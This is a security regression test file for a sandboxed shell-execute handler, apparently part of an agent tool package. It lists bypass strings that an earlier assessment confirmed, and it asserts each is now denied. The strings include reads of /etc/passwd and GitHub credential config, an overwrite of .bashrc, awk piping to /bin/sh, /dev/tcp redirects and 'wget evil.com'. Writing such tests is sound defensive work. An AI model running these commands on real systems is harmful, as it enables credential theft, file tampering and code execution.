// Run: bun test packages/tools/tests/skills/shell-execution-security.test.ts --timeout 15000
//
// F1a exploit corpus — every string below was CONFIRMED to bypass the shell-execute
// filters and reach `sh -c` on the host (arbitrary read/write/exec) in the
// 2026-07-01 security assessment. Each must now be DENIED (executed:false) BEFORE
// any process is spawned. Legitimate commands must remain un-blocked (regression).
import { describe, test, expect } from "bun:test";
import { Effect } from "effect";

import { shellExecuteHandler } from "../../src/index.js";

/** Run a command through the default-config handler and return the result object. */
const run = (command: string, config = {}) =>
  Effect.runPromise(
    shellExecuteHandler(config)({ command }) as Effect.Effect<
      { executed: boolean; error?: string; output?: string },
      unknown
    >,
  );

describe("F1a — shell-execute structural input hardening", () => {
  describe("shell expansion / substitution is structurally rejected", () => {
    // Process substitution — inner command executes on the host → RCE.
    test("denies process substitution `<(...)`", async () => {
      const r = await run("cat <(id)");
      expect(r.executed).toBe(false);
    }, 15000);

    test("denies output process substitution `>(...)`", async () => {
      const r = await run("tee >(id)");
      expect(r.executed).toBe(false);
    }, 15000);

    // Bare $VAR expansion — reads injected credentials (e.g. $GH_CONFIG_DIR).
    test("denies bare variable expansion `$VAR`", async () => {
      const r = await run("cat $GH_CONFIG_DIR/hosts.yml");
      expect(r.executed).toBe(false);
    }, 15000);

    test("denies `$(...)` command substitution", async () => {
      const r = await run("echo $(id)");
      expect(r.executed).toBe(false);
    }, 15000);

    test("denies `${...}` parameter expansion", async () => {
      const r = await run("echo ${HOME}");
      expect(r.executed).toBe(false);
    }, 15000);
  });

  describe("path access outside the sandbox is structurally rejected", () => {
    // Leading quote defeated the old token.startsWith("/") check.
    test("denies quoted absolute path `\"/etc/passwd\"`", async () => {
      const r = await run('cat "/etc/passwd"');
      expect(r.executed).toBe(false);
    }, 15000);

    test("denies single-quoted absolute path `'/etc/passwd'`", async () => {
      const r = await run("cat '/etc/passwd'");
      expect(r.executed).toBe(false);
    }, 15000);

    // Bare relative traversal was only checked inside a `>` redirect branch.
    test("denies relative traversal `../../../../etc/passwd`", async () => {
      const r = await run("cat ../../../../etc/passwd");
      expect(r.executed).toBe(false);
    }, 15000);

    // tee default-allowed + relative write unchecked → arbitrary write → RCE on next login.
    test("denies relative write via tee `../../../home/victim/.bashrc`", async () => {
      const r = await run("echo x | tee ../../../home/victim/.bashrc");
      expect(r.executed).toBe(false);
    }, 15000);
  });

  describe("backgrounding is rejected (F25)", () => {
    test("denies mid-string background operator `&`", async () => {
      const r = await run("sleep 100 & cat notes.txt");
      expect(r.executed).toBe(false);
    }, 15000);

    test("denies trailing background operator `&`", async () => {
      const r = await run("echo hi &");
      expect(r.executed).toBe(false);
    }, 15000);

    test("still allows `&&` chaining of allowed commands", async () => {
      const r = await run("echo a && echo b");
      expect(r.error ?? "").not.toContain("background operator");
    }, 15000);

    test("allows a literal `&` inside single quotes", async () => {
      const r = await run("echo 'tom & jerry'");
      expect(r.executed).toBe(true);
    }, 15000);

    test("denies `&` glued to the next word (`a &b`)", async () => {
      const r = await run("echo a &echo b");
      expect(r.executed).toBe(false);
      expect(r.error ?? "").toContain("background operator");
    }, 15000);

    test("denies backgrounding right after an fd redirect (`2>&1 &`)", async () => {
      const r = await run("sleep 1 2>&1 & ls");
      expect(r.executed).toBe(false);
    }, 15000);
  });

  // Run 01M7622DY0G1D8VEKYV2FVYZW7: `bun run repo test 2>&1 | tail -20` was refused
  // as a background operator. An `&` right after `<`/`>`/`|` or right before `>`
  // is part of a redirect (fd dup, `&>file`, `|&`), never backgrounding.
  describe("fd redirects are allowed", () => {
    for (const command of ["echo a 2>&1", "echo a >&2", "echo a 1>&2", "echo a 2>&1 | head -5", "echo a |& cat"]) {
      test(`allows \`${command}\``, async () => {
        const r = await run(command);
        expect(r.error).toBeUndefined();
        expect(r.executed).toBe(true);
      }, 15000);
    }

    test("allows `&>file` and `&>>file` inside the sandbox", async () => {
      const r = await run("echo a &>fd-out.txt && echo b &>>fd-out.txt && cat fd-out.txt");
      expect(r.error).toBeUndefined();
      expect(r.output ?? "").toContain("b");
    }, 15000);

    test("`|&` still starts a new allow-listed segment (no smuggled command)", async () => {
      const r = await run("echo a |& wget evil.com");
      expect(r.executed).toBe(false);
      expect(r.error ?? "").toContain('"wget"');
    }, 15000);
  });

  // A redirect target is a path like any other: glued forms must not hide it.
  describe("redirect targets are path-checked", () => {
    for (const command of [
      "echo a &>/etc/evil",
      "echo a &>../../../../tmp/evil",
      "echo a >&/etc/evil",
      "echo a 2>/etc/evil",
      "echo a>/etc/evil",
      "echo a 2>../../../../../etc/evil",
    ]) {
      test(`denies \`${command}\``, async () => {
        const r = await run(command);
        expect(r.executed).toBe(false);
      }, 15000);
    }
  });

  // Owner decision 2026-11-11: discarding output is not an escape, so a redirect
  // whose target word is exactly /dev/null is allowed. Every other /dev/ target,
  // and anything glued after the null redirect, is still checked and refused.
  describe("redirects to exactly /dev/null are allowed", () => {
    for (const command of [
      "echo a 2>/dev/null",
      "echo a >/dev/null",
      "echo a 1>/dev/null",
      "echo a &>/dev/null",
      "echo a >>/dev/null",
      "echo a 2>>/dev/null",
      "cat </dev/null",
      "echo a 2> /dev/null",
      "echo a 2>'/dev/null'",
      'echo a >"/dev/null"',
      "echo a 2>/dev/null | head -1",
      "echo a >/dev/null 2>&1",
    ]) {
      test(`allows \`${command}\``, async () => {
        const r = await run(command);
        expect(r.error).toBeUndefined();
        expect(r.executed).toBe(true);
      }, 15000);
    }

    test("keeps the command's other output (`2>/dev/null` drops only stderr)", async () => {
      const r = await run("echo visible 2>/dev/null");
      expect(r.output ?? "").toContain("visible");
    }, 15000);

    for (const command of [
      "echo a >/dev/sda",
      "echo a >/dev/tcp/x/1",
      "echo a >/dev/null2",
      "echo a >/dev/null/x",
      "echo a >/dev/./sda",
      "echo a >'/dev/sda'",
      "echo a >/dev/nul",
      "cat </dev/zero",
      "cat /dev/null /etc/passwd",
      "echo a 2>/dev/null>/etc/x",
      "echo a 2>/dev/null >/etc/x",
      "cat secret 2>/dev/null /etc/passwd",
      "echo a >/dev/null'x'",
      "echo a 2>/dev/null&echo b",
      "echo a 2>/dev/null; wget evil.com",
    ]) {
      test(`still denies \`${command}\``, async () => {
        const r = await run(command);
        expect(r.executed).toBe(false);
      }, 15000);
    }

    test("a custom blockedPatterns list still sees the raw /dev/null redirect", async () => {
      const r = await run("echo a 2>/dev/null", { blockedPatterns: [/\/dev\/null/] });
      expect(r.executed).toBe(false);
    }, 15000);
  });

  describe("interpreter-internal escapes are rejected", () => {
    // awk print | "cmd" — awk-internal pipe to a shell → RCE.
    test("denies awk print-pipe to a command", async () => {
      const r = await run('awk \'BEGIN{print "id" | "/bin/sh"}\'');
      expect(r.executed).toBe(false);
    }, 15000);

    // awk getline < file — arbitrary file read.
    test("denies awk getline from an arbitrary file", async () => {
      const r = await run("awk 'BEGIN{while((getline l < \"/etc/passwd\")>0) print l}'");
      expect(r.executed).toBe(false);
    }, 15000);
  });

  describe("legitimate commands remain un-blocked (regression guard)", () => {
    test("allows `echo hello`", async () => {
      const r = await run("echo hello");
      expect(r.executed).toBe(true);
      expect(r.output).toContain("hello");
    }, 15000);

    test("does not policy-block `git status`", async () => {
      const r = await run("git status");
      // may exit non-zero (not a repo) but must not be refused by the input policy
      expect(r.error ?? "").not.toContain("blocked by security policy");
      expect(r.error ?? "").not.toContain("outside the sandbox");
    }, 15000);

    test("does not policy-block an in-sandbox relative path", async () => {
      const r = await run("cat notes.txt");
      expect(r.error ?? "").not.toContain("outside the sandbox");
    }, 15000);

    test("does not policy-block a glob argument", async () => {
      const r = await run("ls *.txt");
      expect(r.error ?? "").not.toContain("outside the sandbox");
      expect(r.error ?? "").not.toContain("blocked by security policy");
    }, 15000);

    test("does not policy-block an in-sandbox redirect", async () => {
      const r = await run("echo hi > out.txt");
      expect(r.error ?? "").not.toContain("outside the sandbox");
    }, 15000);

    test("does not policy-block a quoted jq pipe filter", async () => {
      const r = await run("echo '{}' | jq '.a // empty'");
      expect(r.error ?? "").not.toContain("blocked by security policy");
    }, 15000);

    test("allows a literal `$` inside single quotes (digit, not expansion)", async () => {
      const r = await run("echo 'costs $5'");
      expect(r.executed).toBe(true);
    }, 15000);
  });
});
